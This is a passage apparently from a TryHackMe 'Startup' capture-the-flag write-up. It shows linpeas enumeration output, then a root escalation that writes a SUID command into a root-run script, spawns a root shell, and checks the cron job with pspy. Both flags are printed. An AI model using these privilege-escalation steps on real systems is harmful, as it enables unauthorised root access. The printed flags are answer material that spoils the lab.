╔══════════╣ Interesting writable files owned by me or writable by everyone (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
/dev/mqueue                                                                                                                                                                                                                                 
/dev/shm
/dev/shm/linpeas.sh
/etc/print.sh
/home/lennie
/run/cloud-init/tmp
/run/lock
/run/user/1002
/run/user/1002/systemd
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/.Test-unix
/tmp/tmux-1002
/tmp/.X11-unix
#)You_can_write_even_more_files_inside_last_directory

/var/crash
/var/lib/lxcfs/cgroup/memory/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/init.scope/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/acpid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/apport.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/atd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cloud-config.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cloud-final.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cloud-init-local.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cloud-init.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/cron.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/grub-common.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ifup@eth0.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/iscsid.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-lvmetad.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxcfs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/lxd-containers.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/mdadm.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/-.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/networking.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ondemand.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/open-iscsi.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/polkitd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/proc-sys-fs-binfmt_misc.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/resolvconf.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/run-user-1002.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.apparmor.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/snapd.seeded.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/system-serialx2dgetty.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/var-lib-lxcfs.mount/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/virtualbox-guest-utils.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/system.slice/vsftpd.service/cgroup.event_control
/var/lib/lxcfs/cgroup/memory/user.slice/cgroup.event_control
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service/init.scope
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service/init.scope/cgroup.clone_children
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service/init.scope/cgroup.procs
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service/init.scope/notify_on_release
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service/init.scope/tasks
/var/lib/lxcfs/cgroup/name=systemd/user.slice/user-1002.slice/user@1002.service/tasks
/var/lib/php/sessions
/var/tmp

╔══════════╣ Interesting GROUP writable files (not in Home) (max 500)
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#writable-files                                                                                                                                                           
  Group lennie:                                                                                                                                                                                                                             
/dev/shm/linpeas.sh                                                                                                                                                                                                                         

╔══════════╣ Searching *password* or *credential* files in home (limit 70)
/bin/systemd-ask-password                                                                                                                                                                                                                   
/bin/systemd-tty-ask-password-agent
/etc/pam.d/common-password
/usr/lib/git-core/git-credential
/usr/lib/git-core/git-credential-cache
/usr/lib/git-core/git-credential-cache--daemon
/usr/lib/git-core/git-credential-store
  #)There are more creds/passwds files in the previous parent folder

/usr/lib/grub/i386-pc/password.mod
/usr/lib/grub/i386-pc/password_pbkdf2.mod
/usr/lib/python3/dist-packages/cloudinit/config/cc_set_passwords.py
/usr/lib/python3/dist-packages/cloudinit/config/__pycache__/cc_set_passwords.cpython-35.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/client_credentials.py
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/client_credentials.cpython-35.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/__pycache__/resource_owner_password_credentials.cpython-35.pyc
/usr/lib/python3/dist-packages/oauthlib/oauth2/rfc6749/grant_types/resource_owner_password_credentials.py
/usr/share/dns/root.key
/usr/share/doc/git/contrib/credential
/usr/share/doc/git/contrib/credential/gnome-keyring/git-credential-gnome-keyring.c
/usr/share/doc/git/contrib/credential/netrc/git-credential-netrc
/usr/share/doc/git/contrib/credential/osxkeychain/git-credential-osxkeychain.c
/usr/share/doc/git/contrib/credential/wincred/git-credential-wincred.c
/usr/share/man/man1/git-credential.1.gz
/usr/share/man/man1/git-credential-cache.1.gz
/usr/share/man/man1/git-credential-cache--daemon.1.gz
/usr/share/man/man1/git-credential-store.1.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/man/man7/gitcredentials.7.gz
/usr/share/man/man8/systemd-ask-password-console.path.8.gz
/usr/share/man/man8/systemd-ask-password-console.service.8.gz
/usr/share/man/man8/systemd-ask-password-wall.path.8.gz
/usr/share/man/man8/systemd-ask-password-wall.service.8.gz
  #)There are more creds/passwds files in the previous parent folder

/usr/share/pam/common-password.md5sums
/var/cache/debconf/passwords.dat
/var/lib/cloud/instances/iid-2448b7d2ed594e9e/sem/config_set_passwords
/var/lib/pam/password

╔══════════╣ Checking for TTY (sudo/su) passwords in audit logs
                                                                                                                                                                                                                                            
╔══════════╣ Searching passwords inside logs (limit 70)
2020-11-12 04:50:29,391 - subp.py[DEBUG]: Running command ['passwd', '-l', 'ubuntu'] with allowed return codes [0] (shell=False, capture=True)                                                                                              
2020-11-12 04:50:34,605 - util.py[DEBUG]: Writing to /var/lib/cloud/instances/iid-2448b7d2ed594e9e/sem/config_set_passwords - wb: [644] 25 bytes
2020-11-12 04:50:34,606 - cc_set_passwords.py[DEBUG]: Leaving SSH config 'PasswordAuthentication' unchanged. ssh_pwauth=None
2020-11-12 04:50:34,606 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords ran successfully
2020-11-12 05:08:53,905 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2020-11-12 05:08:53,905 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)
2022-11-01 02:56:02,920 - handlers.py[DEBUG]: finish: modules-config/config-set-passwords: SUCCESS: config-set-passwords previously ran
2022-11-01 02:56:02,920 - helpers.py[DEBUG]: config-set-passwords already ran (freq=once-per-instance)



                                ╔════════════════╗
════════════════════════════════╣ API Keys Regex ╠════════════════════════════════                                                                                                                                                          
                                ╚════════════════╝                                                                                                                                                                                          
Regexes to search for API keys aren't activated, use param '-r' 

```

Few things:
1. /etc/print.sh seems writable (but we would need planner.sh to be executed by root. Couldn't find crontab.)
2. Could try dirty sock attack
```
-rwsr-xr-x 1 root root 109K Sep  8  2020 /usr/lib/snapd/snap-confine  --->  Ubuntu_snapd<2.37_dirty_sock_Local_Privilege_Escalation(CVE-2019-7304)
```
3. Vulnerable to CVE-2021-4034

Modified '/etc/print.sh' to SUID /bin/bash:
```
chmod +s /bin/bash;
```

Wait for it. I couldn't find it in crontab, don't know who is running it, but few seconds laters...
```
(remote) lennie@startup:/home/lennie# ls -al /bin/bash
-rwsr-sr-x 1 root root 1037528 Jul 12  2019 /bin/bash
```

Get Root
```
(remote) lennie@startup:/home/lennie$ /bin/bash -p
(remote) root@startup:/home/lennie# whoami
root
(remote) root@startup:/home/lennie# 
```

Get Flag
```
(remote) root@startup:/home/lennie# cat /root/root.txt

THM{f963aaa6a430f210222158ae15c3d76d}
```

After getting root, I wanted to see why 'planner.sh' was running.

Uploaded pspsy64 from [1] with pwncat
```
(local) pwncat$ upload /opt/pspy64
./pspy64 ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100.0% • 4.5/4.5 MB • 181.5 kB/s • 0:00:00
[00:27:13] uploaded 4.47MiB in 25.13 seconds                                                                                                                                                                                    upload.py:77
(local) pwncat$
```

Run it.
```
2022/11/01 04:29:01 CMD: UID=0    PID=1974   | /bin/bash /home/lennie/scripts/planner.sh 
2022/11/01 04:29:01 CMD: UID=0    PID=1973   | /bin/bash /home/lennie/scripts/planner.sh 
2022/11/01 04:29:01 CMD: UID=0    PID=1972   | /bin/sh -c /home/lennie/scripts/planner.sh 
2022/11/01 04:30:01 CMD: UID=0    PID=2033   | /bin/bash /home/lennie/scripts/planner.sh 
2022/11/01 04:30:01 CMD: UID=0    PID=2032   | /bin/sh -c /home/lennie/scripts/planner.sh 
```

Root seems to call this script every minute.


## Flag

1. User

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

2. Privesc

```
THM{f963aaa6a430f210222158ae15c3d76d}
```
